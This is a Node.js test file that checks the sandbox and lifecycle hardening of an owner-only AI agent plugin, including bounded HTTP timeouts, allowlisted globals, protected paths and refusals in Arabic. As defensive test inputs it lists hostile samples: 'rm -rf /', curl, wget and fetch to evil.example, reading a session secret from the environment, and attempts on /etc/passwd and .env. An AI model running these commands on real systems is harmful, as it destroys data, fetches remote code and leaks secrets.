// Todo 27 — Harden the owner AI agent plugin (plugins/owner/agent.js)
// Cases live here so `node --test tests/unit.test.mjs` (the lane aggregator) runs them.
//
// The behavioural cases import the plugin module inside a child process: the module
// starts timers and touches the filesystem on import, so it must not be imported
// into the test runner itself.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync, existsSync, rmSync, readdirSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { execFileSync } from 'node:child_process'

const here = dirname(fileURLToPath(import.meta.url))
const ROOT = join(here, '..')
const AGENT_REL = join('plugins', 'owner', 'agent.js')
const AGENT = join(ROOT, AGENT_REL)
const src = readFileSync(AGENT, 'utf8')

// ── helper: run a probe inside a child process that imports the plugin ────
const PROBE = `
import fs from 'node:fs'
import path from 'node:path'
import { pathToFileURL } from 'node:url'

const url = pathToFileURL(process.env.T27_AGENT).href
const mod1 = await import(url)
const timersAfterFirstLoad = global.__agentTimers ? global.__agentTimers.size : -1
// second load with a different query => the framework re-evaluates the module on hot reload
const mod2 = await import(url + '?t=' + Date.now() + '&r=' + Math.random())
const timersAfterSecondLoad = global.__agentTimers ? global.__agentTimers.size : -1

// heartbeat (ActivityStatus) must register itself and must be released on stop()
const conn = { sendMessage: async () => ({ key: { id: 'probe' } }) }
const status = new mod2.ActivityStatus(conn, 'chat', {})
await status.init()
const timersWithHeartbeat = global.__agentTimers ? global.__agentTimers.size : -1
await status.stop()
const timersAfterStop = global.__agentTimers ? global.__agentTimers.size : -1

const samples = JSON.parse(process.env.T27_SAMPLES || '[]')
const checks = []
for (const s of samples) {
  let verdict = null
  let err = null
  try { verdict = mod2.safetyCheckToolCode(s.code) } catch (e) { err = String((e && e.message) || e) }
  checks.push({ name: s.name, verdict, err })
}

let npmResult = null
try { npmResult = await mod2.toolNpm('left-pad') } catch (e) { npmResult = 'THREW: ' + String((e && e.message) || e) }

// runtime enforcement of the restricted tool context (path escapes / protected paths)
let ctxEscape = null
let ctxProtected = null
try {
  const ctx = mod2.buildToolContext('probe')
  try { ctx.fs.writeFileSync('/etc/passwd', 'x') } catch (e) { ctxEscape = String((e && e.message) || e) }
  try { ctx.fs.readFileSync('.env') } catch (e) { ctxProtected = String((e && e.message) || e) }
} catch (e) { ctxEscape = 'SETUP: ' + String((e && e.message) || e) }

// cleanup: the import creates the (empty) agent-tools folder — remove it again
try {
  const toolsDir = path.join(process.cwd(), 'agent-tools')
  if (fs.existsSync(toolsDir) && fs.readdirSync(toolsDir).length === 0) fs.rmSync(toolsDir, { recursive: true, force: true })
} catch {}

process.stdout.write('__T27__' + JSON.stringify({
  timersAfterFirstLoad,
  timersAfterSecondLoad,
  timersWithHeartbeat,
  timersAfterStop,
  checks,
  npmResult,
  ctxEscape,
  ctxProtected,
  allowedGlobals: mod2.TOOL_ALLOWED_GLOBALS.size,
  ctxProps: [...mod2.TOOL_CTX_PROPS],
  httpTimeout: mod2.HTTP_TIMEOUT_MS
}) + '\\n')
process.exit(0)
`

function probe(samples) {
  const out = execFileSync(process.execPath, ['--input-type=module', '-e', PROBE], {
    cwd: ROOT,
    encoding: 'utf8',
    timeout: 60000,
    env: { ...process.env, T27_AGENT: AGENT, T27_SAMPLES: JSON.stringify(samples || []) },
    stdio: ['ignore', 'pipe', 'pipe']
  })
  const line = out.split('\n').find((l) => l.startsWith('__T27__'))
  assert.ok(line, 'probe did not return a result (stdout: ' + out.slice(0, 400) + ')')
  return JSON.parse(line.slice('__T27__'.length))
}

// ── 1. source scans (the acceptance criteria of todo 27) ─────────────────
test('agent guards: no unbounded HTTP timeout is left in the agent plugin', () => {
  const hits = [...src.matchAll(/timeout\s*:\s*0\b/g)].map((m) => m[0])
  assert.deepEqual(hits, [], 'plugins/owner/agent.js still has "timeout: 0"')
  assert.ok(!/axios\.defaults\.timeout\s*=\s*0/.test(src), 'the global axios timeout override is still there')
  // every axios call must carry one of the bounded timeouts
  const axiosCalls = [...src.matchAll(/axios\.(get|post)\(/g)].length
  const bounded = [...src.matchAll(/timeout:\s*HTTP_TIMEOUT_[A-Z_]+/g)].length
  assert.ok(axiosCalls > 0 && bounded >= axiosCalls, 'axios calls: ' + axiosCalls + ', bounded timeouts: ' + bounded)
})

test('agent guards: no shell execution and no runtime npm install', () => {
  assert.ok(!/shell\s*:\s*true/.test(src), 'a shell:true option is still present')
  assert.ok(!/execFile\s*\(/.test(src), 'child_process.execFile is still used')
  assert.ok(!/npm['"]?\s*,\s*\[\s*['"]install/.test(src), 'the npm install path is still present')
  assert.ok(!/from\s+['"]child_process['"]/.test(src) || !/\bexecFile\b(?<!Sync)/.test(src), 'execFile is still imported')
  // the only child_process usage left is node --check, and it is bounded + shell-free
  const exec = src.match(/execFileSync\([^)]*\)/) || ['']
  assert.match(exec[0], /process\.execPath/)
  assert.match(exec[0], /timeout:\s*\d+/)
  assert.ok(!/shell/.test(exec[0]))
})

test('agent guards: the agent stays owner-only', () => {
  assert.match(src, /handler\.owner\s*=\s*true/)
  assert.match(src, /handler\.category\s*=\s*'owner'/)
  // the user facing commands are untouched
  assert.match(src, /handler\.command\s*=\s*\['صانع', 'صنع-بلوقن', 'plugin-agent'\]/)
})

test('agent guards: the sandbox is an allowlist, not a blocklist', () => {
  // the old blocklist markers are gone
  assert.ok(!/ممنوع child_process/.test(src), 'the old blocklist is still in place')
  assert.match(src, /TOOL_ALLOWED_GLOBALS/)
  assert.match(src, /TOOL_ALLOWED_FS/)
  assert.match(src, /TOOL_CTX_PROPS/)
  // and the allowlist is real (not empty)
  const r = probe([])
  assert.ok(r.allowedGlobals > 20, 'the allowlist looks empty: ' + r.allowedGlobals)
  assert.ok(r.ctxProps.includes('axios') && r.ctxProps.includes('readText'))
})

// ── 2. behavioural: the allowlist sandbox ─────────────────────────────────
test('agent guards: the sandbox refuses everything outside the allowlist', () => {
  const hostile = [
    { name: 'rm -rf /', code: 'rm -rf /' },
    { name: 'curl', code: 'curl https://evil.example/x' },
    { name: 'wget', code: 'wget https://evil.example/x' },
    { name: 'npm install', code: "execFile('npm', ['install', 'left-pad'])" },
    { name: 'child_process', code: "const cp = require('child_process')" },
    { name: 'execSync', code: "execSync('rm -rf /')" },
    { name: 'process.env', code: 'const secret = process.env.SESSION_SECRET' },
    { name: 'eval', code: 'eval("1+1")' },
    { name: 'new Function', code: 'new Function("return process")()' },
    { name: 'fetch', code: 'await fetch("https://evil.example")' },
    { name: 'setTimeout', code: 'setTimeout(() => {}, 10)' },
    { name: 'fs.rmSync', code: 'fs.rmSync("/tmp/x", { recursive: true })' },
    { name: 'globalThis', code: 'globalThis.process.exit(1)' },
    { name: 'require', code: "const fs2 = require('fs')" },
    { name: 'dynamic import', code: "await import('node:child_process')" }
  ]
  const r = probe(hostile)
  for (const c of r.checks) {
    assert.equal(c.err, null, c.name + ' threw instead of returning a verdict')
    assert.ok(typeof c.verdict === 'string' && c.verdict.length > 0, c.name + ' was ALLOWED by the sandbox')
    assert.match(c.verdict, /غير مسموح/, c.name + ' was refused without the Arabic "غير مسموح" marker: ' + c.verdict)
  }
})

test('agent guards: the sandbox accepts the documented safe operations', () => {
  const safe = [
    {
      name: 'ctx read/list',
      code: "export default async function (args, ctx) {\n  const text = ctx.readText('package.json')\n  const files = ctx.listDir('plugins')\n  return { text, files }\n}"
    },
    {
      name: 'ctx fs + path',
      code: "export default async function (args, ctx) {\n  const p = ctx.path.join(ctx.ROOT, 'package.json')\n  const raw = ctx.fs.readFileSync(p, 'utf8')\n  return raw.length\n}"
    },
    {
      name: 'ctx axios',
      code: "export default async function (args, ctx) {\n  const r = await ctx.axios.get('https://example.com')\n  return String(r.data).slice(0, 100)\n}"
    },
    {
      name: 'pure computation',
      code: 'export default async function (args, ctx) {\n  const n = Number(args.n || 1)\n  return Math.round(n * 2)\n}'
    }
  ]
  const r = probe(safe)
  for (const c of r.checks) {
    assert.equal(c.err, null, c.name + ' threw: ' + c.err)
    assert.equal(c.verdict, null, c.name + ' was refused: ' + c.verdict)
  }
})

test('agent guards: a tool call attempting npm install is refused in Arabic', () => {
  const r = probe([])
  assert.ok(r.npmResult, 'the npm_install tool returned nothing')
  assert.match(r.npmResult, /غير مسموح/)
  assert.ok(!/تم تثبيت/.test(r.npmResult), 'the npm_install tool still reports a successful install')
})

// ── 3. behavioural: the lifecycle timers are single instance ──────────────
test('agent guards: hot reload does not stack the module timers', () => {
  const r = probe([])
  // one models-cache refresh interval per loaded module
  assert.equal(r.timersAfterFirstLoad, 1, 'expected exactly one module timer after the first load')
  // the second load (hot reload) clears the first one instead of stacking
  assert.equal(r.timersAfterSecondLoad, 1, 'the reload stacked a second module timer')
  // the heartbeat registers itself and is released on stop
  assert.equal(r.timersWithHeartbeat, 2, 'the heartbeat did not register itself')
  assert.equal(r.timersAfterStop, 1, 'the heartbeat was not released on stop')
})

test('agent guards: the tool HTTP client is bounded', () => {
  const r = probe([])
  assert.ok(r.httpTimeout >= 10000 && r.httpTimeout <= 30000, 'unexpected HTTP timeout: ' + r.httpTimeout)
  assert.match(src, /const toolAxios = axios\.create\(\{ timeout: HTTP_TIMEOUT_MS/)
})

test('agent guards: the agent cannot rewrite its own sandbox', () => {
  // plugins/owner/agent.js is protected from the agent's write_file tool
  assert.ok(
    src.includes("/^plugins[\\\\/]owner[\\\\/]agent\\.js$/i"),
    'the agent plugin file is not in the protected-write list'
  )
})

test('agent guards: the tool context cannot escape the project folder', () => {
  const r = probe([])
  assert.ok(r.ctxEscape, 'the probe did not report the runtime escape attempt')
  assert.match(r.ctxEscape, /خارج المشروع/)
  assert.ok(r.ctxProtected, 'the probe did not report the runtime protected-path attempt')
  assert.match(r.ctxProtected, /مسار محمي/)
})
